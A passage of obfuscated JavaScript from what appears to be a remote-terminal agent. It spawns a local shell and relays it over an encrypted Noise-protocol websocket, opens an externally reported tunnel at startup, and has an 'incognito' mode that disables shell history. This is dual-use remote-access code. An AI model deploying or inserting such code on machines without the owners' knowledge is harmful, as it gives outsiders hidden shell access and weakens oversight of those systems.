                'vSphd': function (b, c) {
                    return b === c;
                },
                'PlEYd': na(0xdd8),
                'kBrdy': '[KMODE]\x20tunnel\x20domain\x20not\x20ready',
                'pKuLR': na(0xa92),
                'XzOFY': na(0x76b),
                'hlLTn': 'error'
            };
        try {
            const b = a0q[na(0x7fd)]({
                'input': process[na(0x965)],
                'terminal': ![]
            });
            b['on'](a[na(0x29e)], c => {
                const nb = na;
                a['vSphd'](c[nb(0x5b0)](), a[nb(0x418)]) && console['log'](this[nb(0xab3)] || a[nb(0x762)]);
            }), b['on'](a[na(0x39a)], () => {
            }), b['on'](a[na(0xc2d)], () => {
            });
        } catch (c) {
        }
    }
    static [a0d9(0xe89)](a) {
        const nc = a0d9, b = {
                'sTYoI': function (c, d) {
                    return c + d;
                },
                'jlfFI': function (c, d) {
                    return c + d;
                },
                'LICmB': nc(0x708),
                'xmjDw': ':\x20隧道域名将上报至外部平台',
                'MNHAe': nc(0x5a7),
                'DzIeY': '[KMODE]\x20🚀\x20KMODE=1:\x20启动时自动创建临时隧道',
                'NLZWN': nc(0xe1d)
            };
        if (a0aE[nc(0x17d)] === '2' && this[nc(0x3a8)]()) {
            const c = a0aE['KMODE_QUIC'] === !![];
            a0R[nc(0x543)](b[nc(0xe03)](b[nc(0x6d7)](b['LICmB'], c ? 'q' : '') + b[nc(0xc28)], c ? b[nc(0x7db)] : '')), a[nc(0x96b)] = (d, f) => {
                const nd = nc;
                this[nd(0x518)](f);
            }, a[nc(0xefe)](a0aE[nc(0x563)], ![], c, { 'source': nc(0xe1d) })['then'](d => this[nc(0x81c)](d['tunnelDomain']))[nc(0x92f)](() => {
            });
            return;
        }
        a0R['info'](b['DzIeY']), a[nc(0x96b)] = (d, f) => {
            const ne = nc;
            this[ne(0x796)](f);
        }, a[nc(0xefe)](a0aE['PORT'], ![], ![], { 'source': b['NLZWN'] })[nc(0xdcb)](d => {
            const nf = nc;
            this[nf(0x796)](d[nf(0x140)]);
        })[nc(0x92f)](d => {
            const ng = nc;
            a0R['warn']('[KMODE]\x20⚠️\x20启动隧道创建失败:\x20'[ng(0x83f)](d[ng(0x769)]));
        }), this['startStdinListener']();
    }
}
const a0cU = a0d9(0xc5c);
function a0cV(a) {
    const nh = a0d9;
    return ''[nh(0x83f)](a0aE[nh(0x70d)] || '', '-')[nh(0x83f)](a);
}
function a0cW(a) {
    const ni = a0d9;
    return ''[ni(0x83f)](a)[ni(0x83f)](a0cU);
}
function a0cX(a, b = null, c = null) {
    const nj = a0d9, d = {
            'EMdop': function (h, i) {
                return h === i;
            },
            'SFKWJ': function (h, i) {
                return h(i);
            },
            'xgEtH': function (h, i) {
                return h(i);
            },
            'nwvff': function (h, i) {
                return h < i;
            },
            'mFRBK': nj(0xb58)
        };
    let f;
    if (b === null || d[nj(0xf8c)](b, undefined)) {
        const h = a0aE['KNAME'] || '';
        if (h[nj(0xc54)] < 0x3)
            return 'KNAME\x20未设置或过短\x20('[nj(0x83f)](h[nj(0xc54)], nj(0x8a7));
        if (!a0cT[nj(0xae2)]['test'](h))
            return nj(0x887);
        f = ''['concat'](h, '-')['concat'](a);
    } else
        f = d['SFKWJ'](String, b);
    const g = d[nj(0xf8c)](c, null) || c === undefined ? a0cW(f) : d[nj(0x564)](String, c);
    if (d[nj(0x840)](f[nj(0xc54)], 0x3))
        return nj(0x3f6)[nj(0x83f)](f['length'], nj(0x32a));
    if (!a0cT[nj(0xae2)]['test'](f))
        return d['mFRBK'];
    if (d['nwvff'](g[nj(0xc54)], 0x8))
        return '管理密钥过短\x20('[nj(0x83f)](g[nj(0xc54)], nj(0xe44));
    return null;
}
let a0cY = null, a0cZ = null;
const a0d0 = new Promise((a, b) => {
    const nk = a0d9, c = {
            'Ljats': nk(0x1db),
            'ogugx': '[WARN]\x20Noise\x20WASM\x20module\x20failed\x20to\x20load:',
            'pfBZa': function (d) {
                return d();
            },
            'WqmdR': nk(0x304),
            'qdgtG': nk(0xf30)
        };
    try {
        a0y(function (d) {
            const nl = nk;
            if (!d) {
                a0cZ = new Error(c['Ljats']), a0R['warn'](c[nl(0xfd0)], a0cZ['message']), c[nl(0x9f6)](a);
                return;
            }
            a0cY = d, a0R[nl(0xac2)](c[nl(0x957)]), c[nl(0x9f6)](a);
        });
    } catch (d) {
        a0cZ = d, a0R[nk(0x585)](c[nk(0xbe0)], d[nk(0x769)]), c[nk(0x9f6)](a);
    }
});
process['on'](a0d9(0xf2d), (a, b) => {
    const nm = a0d9;
    a0R['error'](nm(0x72e), a);
}), process['on']('uncaughtException', a => {
    const nn = a0d9, b = { 'YCAMf': 'Uncaught\x20Exception:' };
    a0R[nn(0xfcc)](b[nn(0x342)], a), process[nn(0x1ce)](0x1);
});
class a0d1 {
    constructor(a, b, c) {
        const no = a0d9;
        this[no(0xfb6)] = a, this['localPrivB64'] = b, this[no(0xb00)] = c, this['handshakeFinished'] = ![], this['hs'] = null, this[no(0xb17)] = null, this['recvCipher'] = null;
    }
    async ['init']() {
        const np = a0d9, a = {
                'ngosw': np(0x206),
                'lSXVR': np(0x808),
                'WqmBV': np(0x1b4),
                'hdDqC': 'base64'
            };
        await a0d0;
        if (!a0cY)
            throw a0cZ || new Error(a[np(0x62a)]);
        const b = a0cY, c = this['isInitiator'] ? b[np(0xc8c)][np(0xc08)] : b['constants'][np(0xf3f)];
        this['hs'] = b[np(0x8ac)](a[np(0x218)], c);
        const d = Buffer[np(0xca5)](a[np(0xa89)]), f = this[np(0xf85)] ? Buffer['from'](this[np(0xf85)], a[np(0xfc0)]) : null, g = this[np(0xb00)] ? Buffer[np(0xca5)](this[np(0xb00)], a[np(0xfc0)]) : null;
        this['hs']['Initialize'](d, f, g, null);
    }
    ['processHandshake'](a) {
        const nq = a0d9, b = {
                'Gskto': function (d, f) {
                    return d > f;
                },
                'attZx': function (d, f) {
                    return d === f;
                },
                'eawpb': function (d, f) {
                    return d === f;
                }
            };
        if (this['handshakeFinished'])
            return Buffer[nq(0x901)](0x0);
        const c = a0cY;
        a && b[nq(0xd3a)](a['length'], 0x0) && b[nq(0x99d)](this['hs'][nq(0x1da)](), c[nq(0xc8c)][nq(0x678)]) && this['hs']['ReadMessage'](a);
        if (b[nq(0xc23)](this['hs'][nq(0x1da)](), c[nq(0xc8c)][nq(0x318)]))
            return this['_splitAndFinish'](), Buffer[nq(0x901)](0x0);
        if (this['hs'][nq(0x1da)]() === c['constants']['NOISE_ACTION_WRITE_MESSAGE']) {
            const d = this['hs'][nq(0x89f)](new Uint8Array(0x0));
            return this['hs'][nq(0x1da)]() === c[nq(0xc8c)][nq(0x318)] && this[nq(0xd25)](), Buffer[nq(0xca5)](d);
        }
        return Buffer[nq(0x901)](0x0);
    }
    [a0d9(0xd25)]() {
        const nr = a0d9, a = { 'JlGbZ': 'base64' };
        let b = null;
        try {
            b = this['hs'][nr(0x6ec)]();
        } catch (g) {
            b = null;
        }
        const c = this[nr(0xb00)] ? Buffer[nr(0xca5)](this[nr(0xb00)], a[nr(0x298)]) : null, d = b && c && b[nr(0xc54)] === c[nr(0xc54)] && a0k[nr(0xa96)](Buffer[nr(0xca5)](b), c);
        if (!d)
            throw new Error(nr(0x14d));
        const f = this['hs']['Split']();
        this['sendCipher'] = f[0x0], this[nr(0x382)] = f[0x1], this[nr(0xf55)] = !![];
        try {
            if (this['hs'])
                this['hs']['free']();
        } catch (h) {
        }
        this['hs'] = null;
    }
    [a0d9(0xfb0)](a) {
        const ns = a0d9, b = { 'ZMEUq': ns(0x4e3) };
        if (!this[ns(0xf55)])
            throw new Error(b[ns(0x912)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[ns(0xca5)](this[ns(0xb17)][ns(0xd7b)](c, d));
    }
    [a0d9(0xf46)](a) {
        const nt = a0d9, b = { 'sOGDU': nt(0x2c5) };
        if (!this[nt(0xf55)])
            throw new Error(b[nt(0x5ec)]);
        const c = new Uint8Array(0x0), d = new Uint8Array(a);
        return Buffer[nt(0xca5)](this[nt(0x382)][nt(0xb34)](c, d));
    }
    ['free']() {
        const nu = a0d9, a = { 'JZeKj': '0|2|4|5|1|3' }, b = a['JZeKj']['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                try {
                    if (this['sendCipher'])
                        this[nu(0xb17)]['free']();
                } catch (d) {
                }
                continue;
            case '1':
                this['recvCipher'] = null;
                continue;
            case '2':
                try {
                    if (this[nu(0x382)])
                        this['recvCipher']['free']();
                } catch (f) {
                }
                continue;
            case '3':
                this['hs'] = null;
                continue;
            case '4':
                try {
                    if (this['hs'])
                        this['hs'][nu(0xc3b)]();
                } catch (g) {
                }
                continue;
            case '5':
                this['sendCipher'] = null;
                continue;
            }
            break;
        }
    }
}
class a0d2 {
    constructor(a, b, c, d) {
        const nv = a0d9, f = { 'ZUXpo': nv(0xe04) }, g = f[nv(0x87c)][nv(0xa6a)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[nv(0x643)] = a;
                continue;
            case '1':
                this['proc'] = null;
                continue;
            case '2':
                this[nv(0x1075)] = c;
                continue;
            case '3':
                this[nv(0x29c)] = null;
                continue;
            case '4':
                this['_onExitCb'] = null;
                continue;
            case '5':
                this[nv(0xe6a)] = b;
                continue;
            case '6':
                this[nv(0x21a)] = d || [];
                continue;
            case '7':
                this['pid'] = 0x0;
                continue;
            }
            break;
        }
    }
    [a0d9(0x103b)]() {
        const nw = a0d9, a = {
                'YJdde': function (c, d) {
                    return c || d;
                },
                'OaSPT': function (c, d, f, g) {
                    return c(d, f, g);
                },
                'igrqg': 'pipe',
                'KXHcb': nw(0xe83),
                'XUjiw': 'exit'
            };
        this['proc'] = a[nw(0x615)](a0s, this[nw(0x643)], this[nw(0x21a)], {
            'env': this['env'],
            'cwd': this['cwd'],
            'windowsHide': !![],
            'stdio': [
                a[nw(0xd31)],
                a[nw(0xd31)],
                a[nw(0xd31)]
            ]
        }), this[nw(0x783)] = this['proc']['pid'] || 0x0;
        const b = this;
        this['proc']['stdout']['on'](a[nw(0x6e1)], c => b[nw(0x736)](c)), this[nw(0x2a9)]['stderr']['on'](a[nw(0x6e1)], c => b[nw(0x736)](c)), this[nw(0x2a9)]['on'](a[nw(0x7f9)], (c, d) => {
            const nx = nw;
            if (b[nx(0xa8e)])
                b[nx(0xa8e)]({
                    'exitCode': c,
                    'signal': a['YJdde'](d, null)
                });
        });
    }
    [a0d9(0x736)](a) {
        const ny = a0d9, b = { 'ANmRz': ny(0x368) };
        if (this[ny(0x29c)])
            this[ny(0x29c)](a[ny(0x43a)](b[ny(0x906)]));
    }
    ['onData'](a) {
        const nz = a0d9;
        return this[nz(0x29c)] = a, {
            'dispose': () => {
                this['_onDataCb'] = null;
            }
        };
    }
    ['onExit'](a) {
        const nA = a0d9;
        return this[nA(0xa8e)] = a, {
            'dispose': () => {
                this['_onExitCb'] = null;
            }
        };
    }
    ['write'](a) {
        const nB = a0d9;
        if (!this[nB(0x2a9)] || !this[nB(0x2a9)]['stdin'])
            return;
        try {
            this[nB(0x2a9)][nB(0x965)][nB(0xc5e)](a);
        } catch (b) {
        }
    }
    ['resize']() {
    }
    [a0d9(0x3e3)]() {
        const nC = a0d9;
        try {
            if (this['proc'])
                this[nC(0x2a9)][nC(0x3e3)]();
        } catch (a) {
        }
    }
}
class a0d3 {
    constructor() {
        const nD = a0d9, a = { 'Aojse': nD(0xc7d) };
        this[nD(0x65e)] = null, this[nD(0x5c1)] = null, this[nD(0xae4)] = null, this[nD(0x421)] = !![], this[nD(0x30a)] = ![], this[nD(0x57d)] = ![], this[nD(0x62f)] = a[nD(0xb2a)], this[nD(0xbf1)] = [], this[nD(0x49c)] = [], this['AGENT_PRIVATE_KEY'] = a0aE[nD(0xfb7)][nD(0x307)][nD(0x977)], this[nD(0xb5d)] = a0aE[nD(0xfb7)][nD(0xfc8)]['public_b64'], this['cipher'] = new a0d1(![], this[nD(0x693)], this[nD(0xb5d)]);
    }
    async [a0d9(0xeee)]() {
        const nE = a0d9, a = {
                'TuaYu': function (b, c) {
                    return b === c;
                },
                'SHhWY': function (b, c) {
                    return b === c;
                }
            };
        this['requestId'] && a0R[nE(0x543)]('['[nE(0x83f)](this['requestId'], nE(0x625)));
        if (this[nE(0x65e)]) {
            a[nE(0x1031)](process[nE(0x4a4)], nE(0xd3b)) && this[nE(0x65e)][nE(0x783)] && this['_taskkillTree'](this['ptyProcess']['pid']);
            try {
                this['ptyProcess'][nE(0x3e3)]();
            } catch (b) {
            }
            this[nE(0x65e)] = null;
        }
        if (this['cipher'])
            this[nE(0x982)]['free']();
        if (this[nE(0x5c1)])
            try {
                a[nE(0x1f7)](this['websocket'][nE(0x1018)], this[nE(0x5c1)][nE(0x66a)]) && this['websocket'][nE(0x76b)](0x3e8, nE(0xe0b));
            } catch (c) {
            } finally {
                this[nE(0x5c1)] = null;
            }
    }
    [a0d9(0x673)](a) {
        const nF = a0d9, b = {
                'iWHSX': function (c, d, f, g) {
                    return c(d, f, g);
                }
            };
        try {
            b[nF(0xbda)](a0r, nF(0xa1f)['concat'](a), { 'windowsHide': !![] }, () => {
            });
        } catch (c) {
        }
    }
    [a0d9(0x7e8)](a) {
        const nG = a0d9, b = {
                'hHlVH': function (c, d) {
                    return c === d;
                },
                'fctbn': nG(0xc7d),
                'IIisq': function (c, d) {
                    return c > d;
                },
                'ZVZoT': function (c, d) {
                    return c === d;
                }
            };
        if (b[nG(0x627)](this[nG(0x62f)], b[nG(0x3c7)])) {
            if (b[nG(0x5ce)](this[nG(0x49c)][nG(0xc54)], 0x0)) {
                const c = this['msgResolvers'][nG(0x719)]();
                c(a);
            } else
                this[nG(0xbf1)][nG(0xb66)](a);
        } else
            b[nG(0x797)](this[nG(0x62f)], nG(0x664)) && this[nG(0x3dc)](a);
    }
    async [a0d9(0x8c7)]() {
        const nH = a0d9, a = {
                'yWzGj': function (b, c) {
                    return b > c;
                }
            };
        if (a[nH(0x244)](this[nH(0xbf1)][nH(0xc54)], 0x0))
            return this[nH(0xbf1)]['shift']();
        return new Promise(b => {
            const nI = nH;
            this[nI(0x49c)][nI(0xb66)](b);
        });
    }
    async [a0d9(0x6c3)](a) {
        const nJ = a0d9, b = {
                'ZDmBi': function (c, d) {
                    return c(d);
                },
                'SFpdw': '🤝\x20开始\x20Noise\x20加密握手...',
                'wDWbz': '加密握手失败'
            };
        b[nJ(0xf00)](a, b[nJ(0xf13)]);
        try {
            await this[nJ(0x982)][nJ(0xd4d)]();
            const c = await this[nJ(0x8c7)](), d = this[nJ(0x982)][nJ(0x4da)](c);
            d && d[nJ(0xc54)] > 0x0 && this[nJ(0x5c1)][nJ(0x871)](d);
            const f = await this[nJ(0x8c7)]();
            this[nJ(0x982)][nJ(0x4da)](f);
            if (!this[nJ(0x982)]['handshakeFinished'])
                throw new Error(nJ(0x2be));
            b[nJ(0xf00)](a, '✅\x20Noise\x20握手完成，端到端加密通道已建立！');
        } catch (g) {
            b[nJ(0xf00)](a, nJ(0x26f)[nJ(0x83f)](g[nJ(0x769)]));
            throw new Error(b['wDWbz']);
        }
    }
    [a0d9(0xe10)]() {
        const nK = a0d9, a = {
                'mujkf': function (d, f) {
                    return d === f;
                },
                'OhiGW': nK(0xd3b),
                'xrYCF': nK(0xacb),
                'Qtuve': nK(0x8f0),
                'oTUNM': nK(0xbdd),
                'MNGMq': nK(0xc48),
                'NFlRE': 'cmd.exe',
                'jLxln': nK(0xe7b),
                'ihprN': nK(0x7d4)
            };
        if (a[nK(0x5df)](process['platform'], a[nK(0x880)])) {
            const d = process.env.SystemRoot || nK(0xbb6), f = [
                    a0o[nK(0xd9d)](d, a[nK(0xa54)], a[nK(0x983)], a[nK(0xb6e)], a[nK(0x442)]),
                    process.env.COMSPEC,
                    a0o[nK(0xd9d)](d, a[nK(0xa54)], a[nK(0xcf1)])
                ];
            for (const g of f) {
                if (g && a0l[nK(0x8de)](g))
                    return g;
            }
            return nK(0x395);
        }
        const b = [
            nK(0x846),
            nK(0x8f2),
            a['jLxln']
        ];
        for (const h of b) {
            if (a0l['existsSync'](h))
                return h;
        }
        const c = process.env.SHELL;
        if (c && a0l[nK(0x8de)](c))
            return c;
        return a['ihprN'];
    }
    async [a0d9(0x8e5)](a, b, c, d = ![], f = ![]) {
        const nL = a0d9, g = {
                'QgJMW': function (i, j) {
                    return i(j);
                },
                'leAEs': nL(0x777),
                'oDCOo': nL(0x1070),
                'BkxoP': nL(0x769),
                'pPvYM': function (i, j) {
                    return i(j);
                }
            };
        this[nL(0x5c1)] = a, this[nL(0xae4)] = b, this[nL(0x30a)] = d, this[nL(0x57d)] = f;
        const h = i => a0R[nL(0x543)]('[终端会话\x20'['concat'](b, ']\x20')[nL(0x83f)](i));
        this[nL(0x421)] = !c, g[nL(0x4a1)](h, this[nL(0x421)] ? g[nL(0xba5)] : g['oDCOo']), a['on'](g['BkxoP'], i => this[nL(0x7e8)](i));
        try {
            this[nL(0x421)] && await this['_doNoiseHandshake'](h), await this['_runTerminal'](h);
        } catch (i) {
            g[nL(0x150)](h, nL(0x401)[nL(0x83f)](i[nL(0x769)])), await this[nL(0xeee)]();
        }
    }
    async ['_runTerminal'](a) {
        const nM = a0d9, b = {
                'iQTTu': nM(0x368),
                'TAnhX': function (h, i) {
                    return h === i;
                },
                'gvdfz': function (h, i) {
                    return h(i);
                },
                'yNJvX': nM(0x6a3),
                'kKSiy': nM(0xab7),
                'fqknK': function (h) {
                    return h();
                },
                'xtpdg': function (h, i) {
                    return h || i;
                },
                'aQkrZ': nM(0x201),
                'tnzhb': function (h, i) {
                    return h(i);
                },
                'UTWvK': function (h, i) {
                    return h(i);
                },
                'ZDbTG': nM(0x4c0),
                'LlzaG': nM(0xd3b),
                'sWIgF': nM(0xab4),
                'HYggk': function (h, i) {
                    return h === i;
                },
                'iIqCR': function (h, i) {
                    return h === i;
                },
                'kEpFn': nM(0xc48),
                'imROg': nM(0x19b),
                'VDVfP': nM(0xebc),
                'QghNT': function (h, i) {
                    return h === i;
                },
                'TyvXC': function (h, i) {
                    return h(i);
                },
                'pPTpE': 'unknown'
            };
        b[nM(0xe38)](process[nM(0x4a4)], b[nM(0xd59)]) && b['TAnhX'](typeof Bun, b[nM(0xee5)]) && !a0C && !a0D && await b[nM(0xf53)](a0Q);
        if (!a0C) {
            const h = b['xtpdg'](a0D, b[nM(0x3b6)]);
            b[nM(0xe40)](a, nM(0xeb8)['concat'](h));
            try {
                this[nM(0x5c1)]['close'](0x3f3, a0H);
            } catch (i) {
            }
            throw new Error(h);
        }
        const c = this[nM(0xe10)]();
        b[nM(0xaa8)](a, nM(0x732)[nM(0x83f)](c));
        const d = Object[nM(0x22d)]({}, process.env);
        delete d[nM(0x687)], d[nM(0x62d)] = nM(0xebc);
        if (!d[nM(0x399)])
            d['LANG'] = b[nM(0x547)];
        this[nM(0x57d)] && process['platform'] !== b[nM(0x28e)] && (d['HISTFILE'] = b[nM(0xf93)]);
        const f = this[nM(0x57d)] && b[nM(0x84b)](process[nM(0x4a4)], b[nM(0x28e)]) && b[nM(0x2fb)](a0o[nM(0xe49)](c)[nM(0x544)](), b[nM(0xb2f)]) ? [
                '-NoExit',
                b[nM(0xbad)],
                nM(0x819)
            ] : [], g = b[nM(0xf53)](a0S);
        try {
            const j = {
                'name': b[nM(0x2ab)],
                'cols': 0x50,
                'rows': 0x18,
                'cwd': g,
                'env': d
            };
            if (b[nM(0x6a1)](process[nM(0x4a4)], b['LlzaG']))
                try {
                    this[nM(0x65e)] = a0C['spawn'](c, f, j);
                } catch (k) {
                    b[nM(0x38f)](a, '⚠️\x20ConPTY\x20启动失败，回退管道模式:\x20'[nM(0x83f)](k[nM(0x769)])), this['ptyProcess'] = new a0d2(c, d, g, f), this[nM(0x65e)][nM(0x103b)]();
                }
            else
                this[nM(0x65e)] = a0C['spawn'](c, f, j);
            b[nM(0xba2)](a, nM(0xdb3)[nM(0x83f)](this[nM(0x65e)][nM(0x783)] || b[nM(0x314)], ')'));
            this[nM(0x30a)] && this[nM(0x2d1)](c);
            this['phase'] = nM(0x664);
            while (this[nM(0xbf1)][nM(0xc54)] > 0x0) {
                const l = this['msgQueue'][nM(0x719)]();
                this[nM(0x3dc)](l);
            }
            this['ptyProcess'][nM(0xff6)](m => {
                const nN = nM;
                try {
                    let n = Buffer[nN(0xca5)](m, b[nN(0x245)]);
                    this['useNoise'] && this[nN(0x982)] && this[nN(0x982)][nN(0xf55)] && (n = this[nN(0x982)]['encrypt'](n)), b[nN(0xe38)](this[nN(0x5c1)]['readyState'], 0x1) && this[nN(0x5c1)][nN(0x871)](n);
                } catch (o) {
                }
            }), this[nM(0x65e)]['onExit'](({
                exitCode: m,
                signal: n
            }) => {
                const nO = nM;
                a(nO(0xb35)[nO(0x83f)](m, nO(0x668))[nO(0x83f)](n, ')')), this[nO(0xeee)]();
            }), this[nM(0x5c1)]['on'](nM(0x76b), () => {
                const nP = nM;
                b[nP(0x38f)](a, nP(0xfff)), this['cleanup']();
            });
        } catch (m) {
            a(nM(0xb97)[nM(0x83f)](m[nM(0x769)])), await this[nM(0xeee)]();
            throw m;
        }
    }
    static ['normalizeShellName'](a) {
        const nQ = a0d9, b = {
                'EbTRj': function (d, f) {
                    return d(f);
                },
                'qytff': function (d, f) {
                    return d || f;
                },
                'Mbcel': '.exe'
            };
        let c = a0o['basename'](b['EbTRj'](String, b['qytff'](a, ''))[nQ(0x5b0)]())[nQ(0x544)]();
        if (c['endsWith'](b[nQ(0x238)]))
            c = c[nQ(0x47b)](0x0, -0x4);
        return c || 'sh';
    }
    static [a0d9(0xc87)](a) {
        const nR = a0d9, b = {
                'YsXql': 'win32',
                'frXWj': function (c, d) {
                    return c(d);
                },
                'NXGdx': function (c, d) {
                    return c || d;
                },
                'pNJjW': function (c, d) {
                    return c === d;
                },
                'jdsiM': nR(0xc48),
                'ndHmI': function (c, d) {
                    return c === d;
                },
                'aadUq': nR(0x395)
            };
        if (process[nR(0x4a4)] === b[nR(0xe42)]) {
            const c = a0o[nR(0xe49)](b[nR(0xac6)](String, b[nR(0x1ab)](a, '')))[nR(0x544)]();
            return b[nR(0xec9)](c, b[nR(0xf70)]) || b[nR(0xad9)](c, b[nR(0x93f)]);
        }
        return !![];
    }
    [a0d9(0x2d1)](a) {
        const nS = a0d9, b = {
                'cOnrB': nS(0x657),
                'NaFYN': function (c, d) {
                    return c === d;
                }
            };
        try {
            let c = Buffer[nS(0xca5)](JSON[nS(0x41c)]({
                'type': b[nS(0x81d)],
                'shell': a0d3['normalizeShellName'](a),
                'path': a,
                'incognito': !!(this[nS(0x57d)] && a0d3[nS(0xc87)](a))
            }));
            this[nS(0x421)] && this[nS(0x982)] && this[nS(0x982)]['handshakeFinished'] && (c = this['cipher'][nS(0xfb0)](c)), this[nS(0x5c1)] && b[nS(0xbe5)](this[nS(0x5c1)][nS(0x1018)], 0x1) && this[nS(0x5c1)][nS(0x871)](c);
        } catch (d) {
        }
    }
    [a0d9(0x3dc)](a) {
        const nT = a0d9, b = {
                'yITsX': 'heartbeat',
                'sysSA': function (c, d) {
                    return c === d;
                },
                'IRwkd': nT(0x618),
                'ituBm': nT(0xd11),
                'CyBMN': function (c, d) {
                    return c !== d;
                },
                'uubpd': 'base64',
                'jeoQo': nT(0x368)
            };
        if (!this[nT(0x65e)])
            return;
        try {
            const c = Buffer[nT(0xca5)](a);
            let d;
            this[nT(0x421)] ? d = this[nT(0x982)]['decrypt'](c) : d = c;
            let f = ![], g = d[nT(0x43a)]('utf-8');
            if (g[nT(0x5b0)]()[nT(0x1ba)]('{'))
                try {
                    const h = JSON[nT(0xadd)](g);
                    f = !![];
                    if (h[nT(0xa49)] === b['yITsX']) {
                        let i = Buffer[nT(0xca5)](JSON[nT(0x41c)]({ 'type': b[nT(0xb19)] }));
                        if (this[nT(0x421)])
                            i = this[nT(0x982)][nT(0xfb0)](i);
                        this['websocket'][nT(0x871)](i);
                        return;
                    }
                    if (b['sysSA'](h[nT(0xa49)], b['IRwkd'])) {
                        this[nT(0x65e)][nT(0x618)](h[nT(0x4ce)] || 0x50, h[nT(0xd77)] || 0x18);
                        return;
                    }
                    if (b['sysSA'](h[nT(0xa49)], b['ituBm']) && b[nT(0x71f)](h[nT(0xe83)], undefined)) {
                        let j = b['sysSA'](h[nT(0xf8f)], b[nT(0xb69)]) ? Buffer[nT(0xca5)](h['data'], b[nT(0xb69)])['toString'](b[nT(0x410)]) : h[nT(0xe83)];
                        this[nT(0x65e)]['write'](j);
                        return;
                    }
                } catch (k) {
                    f = ![];
                }
            !f && this[nT(0x65e)][nT(0xc5e)](d[nT(0x43a)](nT(0x368)));
        } catch (l) {
            a0R['info']('[终端会话\x20'['concat'](this[nT(0xae4)], ']\x20⚠️\x20指令处理异常:\x20')[nT(0x83f)](l[nT(0x769)]));
            if (this[nT(0x421)])
                this['cleanup']();
        }
    }
}
async function a0d4() {
    const nU = a0d9, a = { 'szgBZ': nU(0x180) }, b = await import(nU(0x58f));
    a0A = b['p256'];
    const c = await import(a[nU(0xb5c)]);
    a0B = c[nU(0x727)];
}
async function a0d5(a = {}) {
    const nV = a0d9, b = {
            'AUdki': nV(0xa3c),
            'ciSTS': function (c) {
                return c();
            },
            'nBwWv': nV(0x13c),
            'vmaGR': nV(0xae8),
            'kpZJV': nV(0x5cd),
            'spaIj': nV(0xcc1),
            'XdqEE': function (c, d) {
                return c === d;
            },
            'jKxqm': nV(0xd06),
            'cOfub': 'origin',
            'cOWbC': nV(0x96e),
            'RiQzM': 'Access-Control-Expose-Headers',
            'GmJlD': 'x-encrypted,\x20x-agent-version,\x20x-file-size,\x20x-original-path',
            'JBxTw': nV(0x446),
            'ClsOe': '/config/',
            'btHIO': function (c, d) {
                return c === d;
            },
            'Lnmyo': nV(0x26e),
            'UZfgo': 'body_too_large',
            'ftbEi': function (c, d) {
                return c(d);
            },
            'JXrue': nV(0xfcc),
            'iPDXy': function (c, d) {
                return c !== d;
            },
            'nBTHb': function (c, d) {
                return c < d;
            },
            'MzVfK': function (c, d) {
                return c === d;
            },
            'ICXKg': nV(0x925),
            'CfhQo': nV(0x219),
            'mzQEO': nV(0x1cf),
            'wLUZZ': function (c, d) {
                return c === d;
            },
            'epqnb': nV(0x89a),
            'FSjMR': function (c, d) {
                return c / d;
            },
            'jROqo': function (c, d) {
                return c > d;
            },
            'eAXEZ': function (c, d) {
                return c - d;
            },
            'itrTE': nV(0x1051),
            'diPRR': function (c, d) {
                return c === d;
            },
            'ZXUSG': nV(0xba0),
            'pdXhn': nV(0x2f9),
            'uJSsC': function (c, d) {
                return c(d);
            },
            'wPFHr': nV(0xec4),
            'Vizau': nV(0x3a6),
            'dMrBF': nV(0x52b),
            'dfAPt': 'Missing\x20required\x20custom\x20headers:\x20X-File-Path\x20and\x20X-File-Name',
            'QIvvj': function (c, d) {
                return c !== d;
            },
            'rnyxy': function (c, d, f) {
                return c(d, f);
            },
            'Txwms': function (c, d) {
                return c(d);
            },
            'yeWGC': nV(0xeca),
            'dyHwp': nV(0xf08),
            'BNXqG': 'application/octet-stream',
            'OhYEU': nV(0x6fe),
            'Sdvyi': function (c, d) {
                return c <= d;
            },
            'ggNMq': 'base64',
            'TXffO': nV(0x635),
            'uIOjk': nV(0xec6),
            'yDoLL': function (c, d) {
                return c(d);
            },
            'xgASR': nV(0xc24),
            'bSDUi': nV(0x2de),
            'xXJox': nV(0xf4b),
            'ynIZx': function (c, d) {
                return c(d);
            },
            'OWIYy': function (c, d) {
                return c !== d;
            },
            'jlewX': function (c, d, f) {
                return c(d, f);
            },
            'OAmcx': function (c, d) {
                return c === d;
            },
            'xBBom': '无\x20hub\x20注册\x20(KMODE=3\x20或\x20POST\x20/api/hub\x20动态注册)',
            'stBIp': function (c, d) {
                return c > d;
            },
            'zlZqu': function (c, d) {
                return c(d);
            },
            'VydwS': function (c, d) {
                return c === d;
            },
            'NIJfI': function (c, d) {
                return c === d;
            },
            'hXeZn': nV(0xcd2),
            'lRFtE': function (c, d, f) {
                return c(d, f);
            },
            'bCywg': function (c) {
                return c();
            },
            'wLzgz': function (c, d) {
                return c === d;
            },
            'PKiFy': function (c, d) {
                return c(d);
            },
            'cglSC': function (c, d) {
                return c(d);
            },
            'GsRki': function (c, d) {
                return c(d);
            },
            'pzdht': function (c, d) {
                return c(d);
            },
            'BQMzP': function (c, d) {
                return c !== d;
            },
            'dYPXq': 'invalid_scope',
            'eeuhH': nV(0x755),
            'ypWSc': 'ports\x20必须为端口数组,\x20如\x20{\x22ports\x22:[7788,9090]}',
            'FVWov': function (c) {
                return c();
            },
            'WJMHn': function (c, d) {
                return c(d);
            },
            'Moxdb': function (c, d) {
                return c !== d;
            },
            'TotGP': function (c) {
                return c();
            },
            'aZELG': function (c, d) {
                return c || d;
            },
            'eukOY': 'all',
            'nDNfb': function (c, d) {
                return c(d);
            },
            'yqZjH': function (c, d) {
                return c > d;
            },
            'QtlKC': function (c, d) {
                return c + d;
            },
            'KaAQT': function (c, d) {
                return c * d;
            },
            'cDWJP': function (c, d, f, g, h, i) {
                return c(d, f, g, h, i);
            },
            'rvHoj': 'loopback_unreachable',
            'STqsD': 'port_not_allowed',
            'WJywj': function (c, d) {
                return c(d);
            },
            'pLuBk': function (c, d) {
                return c === d;
            },
            'fllcM': 'port\x20must\x20be\x20an\x20integer\x20between\x201\x20and\x2065535',
            'RmsyT': function (c, d) {
                return c === d;
            },
            'jZtIP': function (c, d) {
                return c === d;
            },
            'vIGEp': function (c, d) {
                return c === d;
            },
            'MulOX': function (c, d) {
                return c(d);
            },
            'YaaHS': nV(0xf0e),
            'YqHdk': nV(0x4e4),
            'oDLsc': function (c, d) {
                return c === d;
            },
